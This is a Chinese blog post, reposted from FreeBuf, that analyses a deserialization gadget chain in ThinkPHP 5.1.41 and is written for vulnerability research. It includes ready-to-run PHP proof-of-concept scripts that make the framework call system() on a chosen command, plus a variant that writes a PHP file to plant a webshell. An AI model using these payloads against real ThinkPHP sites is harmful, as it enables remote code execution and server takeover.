---
title: "PHP反序列化——ThinkPHP5.1.41反序列化链路构造"
description: "ThinkPHP 5.1.41 反序列化链路构造分析。"
publishDate: "2025-09-29T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/0df31c475c0bdfdc371dbfa6f0fbe139.jpeg"
categories: ["PHP Security"]
tags: ["php", "反序列化", "thinkphp"]
---
转载于[PHP反序列化——ThinkPHP5.1.41反序列化链路构造](https://www.freebuf.com/vuls/269882.html)from[4ut15m](https://www.freebuf.com/author/4ut15m)大佬

## POP链

前面部分和thinkPHP 5.1.37中分析的一样

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/3f7efb6fa4cbec7a32f678a644e6eb4f.png)

漏洞利用点从windows中的\_\_destruct()

继续分析removefile()

```php
private function removeFiles()
{
    foreach ($this->files as $filename) {
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this->files = [];
}
```

这里调用file\_exists函数，这里参数被当作字符串处理，所以，会调用该类的\_toString魔术方法

```php
public function __toString()
{
    return $this->toJson();
}
```

继续往下跟进调用

```php
public function toJson($options = JSON_UNESCAPED_UNICODE)
{
    return json_encode($this->toArray(), $options);
}
```



```php
/**
 * 转换当前模型对象为数组
 * @access public
 * @return array
 */
public function toArray()
{
    $item       = [];
    $hasVisible = false;

……

    // 追加属性（必须定义获取器）
    if (!empty($this->append)) {
        foreach ($this->append as $key => $name) {
            if (is_array($name)) {
                // 追加关联对象属性
                $relation = $this->getRelation($key);

                if (!$relation) {
                    $relation = $this->getAttr($key);
                    if ($relation) {
                        $relation->visible($name);
                    }
                }

                $item[$key] = $relation ? $relation->append($name)->toArray() : [];
            } elseif (strpos($name, '.')) {
                list($key, $attr) = explode('.', $name);
                // 追加关联对象属性
                $relation = $this->getRelation($key);

                if (!$relation) {
                    $relation = $this->getAttr($key);
                    if ($relation) {
                        $relation->visible([$attr]);
                    }
                }

                $item[$key] = $relation ? $relation->append([$attr])->toArray() : [];
            } else {
                $item[$name] = $this->getAttr($name, $item);
            }
        }
    }

    return $item;
}
```

走进getAttr函数,

```php
public function getAttr($name, &$item = null)
{
    try {
        $notFound = false;
        $value    = $this->getData($name);
    } catch (InvalidArgumentException $e) {
        $notFound = true;
        $value    = null;
    }

    // 检测属性获取器
    $fieldName = Loader::parseName($name);
    $method    = 'get' . Loader::parseName($name, 1) . 'Attr';

    if (isset($this->withAttr[$fieldName])) {
        if ($notFound && $relation = $this->isRelationAttr($name)) {
            $modelRelation = $this->$relation();
            $value         = $this->getRelationData($modelRelation);
        }

        $closure = $this->withAttr[$fieldName];
        $value   = $closure($value, $this->data);
    } elseif (method_exists($this, $method)) {
        if ($notFound && $relation = $this->isRelationAttr($name)) {
            $modelRelation = $this->$relation();
            $value         = $this->getRelationData($modelRelation);
        }

        $value = $this->$method($value, $this->data);
    } elseif (isset($this->type[$name])) {
        // 类型转换
        $value = $this->readTransform($value, $this->type[$name]);
    } elseif ($this->autoWriteTimestamp && in_array($name, [$this->createTime, $this->updateTime])) {
        if (is_string($this->autoWriteTimestamp) && in_array(strtolower($this->autoWriteTimestamp), [
            'datetime',
            'date',
            'timestamp',
        ])) {
            $value = $this->formatDateTime($this->dateFormat, $value);
        } else {
            $value = $this->formatDateTime($this->dateFormat, $value, true);
        }
    } elseif ($notFound) {
        $value = $this->getRelationAttribute($name, $item);
    }

    return $value;
}
```

找到`$closure = $this->withAttr[$fieldName];`，为了走到此段代码，要满足以下几个条件:

* `$this->withAttr[$fieldName]`被赋值

* `$withAttr`是私有数组变量可控

* `$fieldName`作为传入`getAttr()`函数的$name变量，即`$this->append`

`value = this->getData($name);`跟进getData函数，如果`$this->data`中存在`$name`键，就将`$this->data[$name]`的值赋给value,$this->data与$name皆可控，故value可控

```php
public function getData($name = null)
{
    if (is_null($name)) {
        return $this->data;
    } elseif (array_key_exists($name, $this->data)) {
        return $this->data[$name];
    } elseif (array_key_exists($name, $this->relation)) {
        return $this->relation[$name];
    }
    throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
}
```

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/737b0925f340fd63089a55acdf899066.png)

这里`Attribute`被`trait `修饰，`Conversion`被`trait`修饰，所以全局查找那些类使用了conversion类和`Attribute`类

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/9ebf89250d3b28feb46e59adb8443512.png)

找到model类，但是model类是抽象类，还要找到它的实现类

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/4ea56ed759247c8ca4fdbb342bdf5821.png)



Pivot类满足条件





## 利用链路

```php
Windows->__destruct        
    -->Windows->removeFiles                
    -->Conversion->__toString                
    -->Conversion->toJson                
    -->Conversion->toArray                
-->Attribute->getAttr


Conversion->Model
Model->Pivot
```

## &#x20;POC from [4ut15m](https://www.freebuf.com/author/4ut15m)

```php
<?php
namespace think;
abstract class Model{
    private $data = [];
    private $withAttr = [];
    protected $append = ['4ut15m'=>[]];

    public function __construct($cmd){
        $this->relation = false;
        $this->data = ['4ut15m'=>"calc"];      //任意值,value
        $this->withAttr = ['4ut15m'=>'system'];
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model{
}


namespace think\process\pipes;
use think\model\Pivot;
class Windows{
    private $files = [];

    public function __construct($cmd){
        $this->files = [new Pivot($cmd)];      //Conversion类
    }

}

$windows = new Windows($argv[1]);
//echo urlencode(serialize($windows))."\n";
echo base64_encode(serialize($windows))."\n";

?>
```



## POC self

```php
<?php
namespace think;
abstract class Model{
    protected $append = ["lin"=>[]];
    private $data = ["lin"=>"calc.exe"];
    private $withAttr = ["lin"=>"system"];
    function __construct(){
        $this->relation = false;

    }
}

namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
//    private $withAttr = ["lin"=>"system"];
////    public function __construct()
////    {
////        $this->withAttr=["lin"=>"system"];//system
////    }
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

## [写入文件](https://www.freebuf.com/vuls/317886.html)@[jelly1](https://www.freebuf.com/author/jelly1)，拿到webshell

```php
abstract class Model{
    private $withAttr = [];
    private $data = [];
    public function __construct(){
        $this->data['smi1e'] = '1.php';
        $this->data['jelly'] = '<?php phpinfo();?>';
        $this->withAttr['smi1e'] = 'file_put_contents';
    }
}
```



## Reference：

https://www.freebuf.com/vuls/269882.html

https://www.freebuf.com/vuls/317886.html

